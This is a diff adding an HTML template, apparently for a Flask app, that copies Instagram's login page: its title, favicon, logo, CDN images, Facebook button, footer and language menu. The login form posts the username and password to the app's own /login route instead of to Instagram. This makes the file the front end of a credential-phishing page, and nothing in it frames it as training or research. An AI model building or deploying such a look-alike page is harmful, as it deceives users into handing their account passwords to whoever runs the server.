@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><radialGradient id='a' cx='19.38' cy='42.04' r='44.9' gradientUnits='userSpaceOnUse'><stop offset='0' stop-color='%23fd5'/><stop offset='.33' stop-color='%23ff543f'/><stop offset='.67' stop-color='%23c837ab'/><stop offset='1' stop-color='%234f5bd5'/></radialGradient><path fill='url(%23a)' d='M34.017 41.99l-20 .019c-4.4.004-8.003-3.592-8.008-7.992l-.019-20c-.004-4.4 3.592-8.003 7.992-8.008l20-.019c4.4-.004 8.003 3.592 8.008 7.992l.019 20c.005 4.401-3.592 8.004-7.992 8.008z'/><path fill='%23fff' d='M24 31c-3.859 0-7-3.14-7-7s3.141-7 7-7 7 3.14 7 7-3.141 7-7 7zm0-11.75c-2.619 0-4.75 2.131-4.75 4.75s2.131 4.75 4.75 4.75 4.75-2.131 4.75-4.75-2.131-4.75-4.75-4.75zM31.25 19.09c-.872 0-1.592-.713-1.592-1.592 0-.879.72-1.592 1.592-1.592.876 0 1.592.713 1.592 1.592 0 .879-.716 1.592-1.592 1.592zM30 37H18c-3.859 0-7-3.14-7-7V18c0-3.86 3.141-7 7-7h12c3.859 0 7 3.14 7 7v12c0 3.86-3.141 7-7 7zM18 12.75c-2.894 0-5.25 2.356-5.25 5.25v12c0 2.894 2.356 5.25 5.25 5.25h12c2.894 0 5.25-2.356 5.25-5.25V18c0-2.894-2.356-5.25-5.25-5.25H18z'/></svg>">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="main-container">
+        <div class="content-wrapper">
+        <div class="phone-section">
+            <div class="phone-container">
+                <img src="/images/landing-2x.png" alt="Instagram phones" class="phones-img">
+            </div>
+        </div>            <div class="form-section">
+                <div class="form-container">
+                    <div class="logo-container">
+                        <i data-visualcompletion="css-img" aria-label="Instagram" role="img" style="background-image: url(https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+                    </div>
+                    
+                    <div class="form-wrapper">
+                        <form action="/login" method="POST">
+                            <div class="input-wrapper">
+                                <label class="input-label">
+                                    <input 
+                                        type="text" 
+                                        name="username" 
+                                        class="input-box" 
+                                        placeholder="Phone number, username, or email"
+                                        required
+                                        autocapitalize="off"
+                                        autocorrect="off"
+                                    >
+                                </label>
+                            </div>
+                            <div class="input-wrapper">
+                                <label class="input-label">
+                                    <input 
+                                        type="password" 
+                                        name="password" 
+                                        class="input-box" 
+                                        placeholder="Password"
+                                        required
+                                    >
+                                </label>
+                            </div>
+                            <button type="submit" class="login-button">Log in</button>
+                        </form>
+                    </div>
+                    
+                    <div class="or-divider">
+                        <div class="divider-line"></div>
+                        <div class="divider-text">OR</div>
+                        <div class="divider-line"></div>
+                    </div>
+                    
+                    <div class="fb-login-wrapper">
+                        <button class="fb-login-btn">
+                            <span class="fb-icon-span">
+                                <svg aria-label="Facebook" fill="#385185" height="16" role="img" viewBox="0 0 24 24" width="16">
+                                    <path d="M20.656 3.094A10.986 10.986 0 0 0 12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12a11.986 11.986 0 0 0-3.344-8.906zm-6.281 16.031h-2.969v-7.969H9.094v-2.531h2.312V6.844c0-2.344 1.031-3.75 3.563-3.75h2.531v2.531h-1.594c-1.125 0-1.406.469-1.406 1.313v1.687h3.094l-.375 2.531h-2.719v7.969z"></path>
+                                </svg>
+                            </span>
+                            <span class="fb-text">Log in with Facebook</span>
+                        </button>
+                    </div>
+                    
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                
+                <div class="signup-container">
+                    <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+                </div>
+                
+                <div class="app-download">
+                    <p class="app-text">Get the app.</p>
+                    <div class="store-buttons">
+                        <a href="https://apps.apple.com/app/instagram/id389801252" target="_blank" rel="noopener noreferrer">
+                            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on App Store" class="store-img">
+                        </a>
+                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank" rel="noopener noreferrer">
+                            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="store-img">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="footer-container">
+            <nav class="footer-nav">
+                <ul class="footer-links">
+                    <li><a href="#">Meta</a></li>
+                    <li><a href="#">About</a></li>
+                    <li><a href="#">Blog</a></li>
+                    <li><a href="#">Jobs</a></li>
+                    <li><a href="#">Help</a></li>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">Privacy</a></li>
+                    <li><a href="#">Terms</a></li>
+                    <li><a href="#">Locations</a></li>
+                    <li><a href="#">Instagram Lite</a></li>
+                    <li><a href="#">Threads</a></li>
+                    <li><a href="#">Contact Uploading & Non-Users</a></li>
+                    <li><a href="#">Meta Verified</a></li>
+                </ul>
+            </nav>
+            <div class="footer-bottom">
+                <div class="language-selector">
+                    <select class="language-select" aria-label="Switch Display Language">
+                        <option value="en">English</option>
+                        <option value="af">Afrikaans</option>
+                        <option value="cs">Čeština</option>
+                        <option value="da">Dansk</option>
+                        <option value="de">Deutsch</option>
+                        <option value="el">Ελληνικά</option>
+                        <option value="es">Español</option>
+                        <option value="fi">Suomi</option>
+                        <option value="fr">Français</option>
+                        <option value="id">Bahasa Indonesia</option>
+                        <option value="it">Italiano</option>
+                        <option value="ja">日本語</option>
+                        <option value="ko">한국어</option>
+                        <option value="ms">Bahasa Melayu</option>
+                        <option value="nb">Norsk</option>
+                        <option value="nl">Nederlands</option>
+                        <option value="pl">Polski</option>
+                        <option value="pt-BR">Português (Brasil)</option>
+                        <option value="pt">Português (Portugal)</option>
+                        <option value="ru">Русский</option>
+                        <option value="sv">Svenska</option>
+                        <option value="th">ภาษาไทย</option>
+                        <option value="tl">Filipino</option>
+                        <option value="tr">Türkçe</option>
+                        <option value="zh-CN">中文(简体)</option>
+                        <option value="zh-TW">中文(台灣)</option>
+                        <option value="bn">বাংলা</option>
+                        <option value="gu">ગુજરાતી</option>
+                        <option value="hi">हिन्दी</option>
+                        <option value="hr">Hrvatski</option>
+                        <option value="hu">Magyar</option>
+                        <option value="kn">ಕನ್ನಡ</option>
+                        <option value="ml">മലയാളം</option>
+                        <option value="mr">मराठी</option>
+                        <option value="ne">नेपाली</option>
+                        <option value="pa">ਪੰਜਾਬੀ</option>
+                        <option value="si">සිංහල</option>
+                        <option value="sk">Slovenčina</option>
+                        <option value="ta">தமிழ்</option>
+                        <option value="te">తెలుగు</option>
+                        <option value="vi">Tiếng Việt</option>
+                        <option value="zh-HK">中文(香港)</option>
+                        <option value="bg">Български</option>
+                        <option value="fr-CA">Français (Canada)</option>
+                        <option value="ro">Română</option>
+                        <option value="sr">Српски</option>
+                        <option value="uk">Українська</option>
+                    </select>
+                </div>
+                <span class="copyright">© 2025 Instagram from Meta</span>
+            </div>
+        </div>
+        </div>
+    </footer>
+</body>
+</html>
